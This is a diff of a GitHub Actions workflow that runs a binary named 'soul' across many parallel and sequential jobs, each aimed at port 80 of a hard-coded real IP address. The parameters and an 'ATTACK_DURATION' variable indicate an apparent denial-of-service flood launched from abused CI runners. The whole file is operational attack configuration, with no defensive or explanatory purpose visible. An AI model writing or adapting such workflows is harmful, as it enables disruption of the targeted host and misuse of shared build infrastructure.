@@ -1,45 +1,71 @@
-name: Run Soul Script (5 Jobs)
-
-on:
-  push:
-    branches: [ "main" ]
-  workflow_dispatch:
-  schedule:
-    - cron: "*/30 * * * *"   # every 30 minutes
+name: soulcrack fucker
+on: [push]
 
 jobs:
-  run-soul:
+  stage-0:
     runs-on: ubuntu-22.04
-
     strategy:
-      fail-fast: false
       matrix:
-        job_number: [1,2,3,4,5]
-
+        n: [1, 2, 3, 4, 5]
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v4
-
-      - name: Set up Python
-        uses: actions/setup-python@v5
-        with:
-          python-version: "3.10"
-
-      - name: Install Python dependencies
+      - uses: actions/checkout@v3
+      
+      - name: Install cpulimit (50% CPU limit)
         run: |
-          pip install --upgrade pip
-          pip install requests
-
-      - name: Install cpulimit
+          sudo apt-get update
+          sudo apt-get install -y cpulimit
+          
+      - name: Run with 50% CPU limit
         run: |
-          sudo apt update
-          sudo apt install -y cpulimit
+          chmod +x soul
+          cpulimit -l 50 -- ./soul 125.253.88.217 80 10 400
 
-      - name: Give execute permission
+  stage-1:
+    needs: stage-0
+    runs-on: ubuntu-22.04
+    strategy:
+      matrix:
+        n: [1, 2, 3, 4, 5]
+    steps:
+      - uses: actions/checkout@v3
+      
+      - name: Install cpulimit (50% CPU limit)
         run: |
-          chmod +x *
+          sudo apt-get update
+          sudo apt-get install -y cpulimit
+          
+      - name: Run with 50% CPU limit
+        run: |
+          chmod +x soul
+          cpulimit -l 50 -- ./soul 125.253.88.217 80 60 400
 
-      - name: Run soul (Job ${{ matrix.job_number }})
+  stage-2-calc:
+    runs-on: ubuntu-latest
+    outputs:
+      matrix_list: ${{ steps.calc.outputs.matrix_list }}
+    steps:
+      - id: calc
         run: |
-          echo "Starting Job #${{ matrix.job_number }}"
-          cpulimit -l 50 -- ./soul 125.253.88.217 80 50 100
+          NUM_JOBS=$((${{ env.ATTACK_DURATION }} / 10))
+          ARRAY=$(seq 1 $NUM_JOBS | jq -R . | jq -s -c .)
+          echo "matrix_list=$ARRAY" >> $GITHUB_OUTPUT
+
+  stage-2-sequential:
+    needs: [stage-0, stage-2-calc]
+    runs-on: ubuntu-22.04
+    strategy:
+      max-parallel: 1
+      matrix:
+        iteration: ${{ fromJSON(needs.stage-2-calc.outputs.matrix_list) }}
+    steps:
+      - uses: actions/checkout@v3
+      
+      - name: Install cpulimit (50% CPU limit)
+        run: |
+          sudo apt-get update
+          sudo apt-get install -y cpulimit
+          
+      - name: Sequential 10s Burst with 50% CPU limit
+        run: |
+          chmod +x soul
+          cpulimit -l 50 -- ./soul 125.253.88.217 80 10 400
